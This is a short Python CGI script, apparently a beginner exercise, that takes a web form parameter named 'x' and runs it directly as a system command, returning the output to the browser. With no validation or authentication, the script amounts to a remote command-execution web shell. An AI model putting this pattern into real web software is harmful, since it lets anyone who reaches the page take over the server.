#!/usr/bin/python3

print("content-type: text/html")     # this line is used by the  browser as Head of Website
print()                              # used to seprate Head of website to its Body

import cgi			     # CGI is Common Gateway Interface between client and server
import subprocess		     # this is used to retrive data and produce output by running system command 

form = cgi.FieldStorage()	      
cmd  = form.getvalue("x")	     # var is the variable that store the input from the website page 
output = subprocess.getoutput(cmd)   # the value store in var is parse into system command and it return output
print(output)
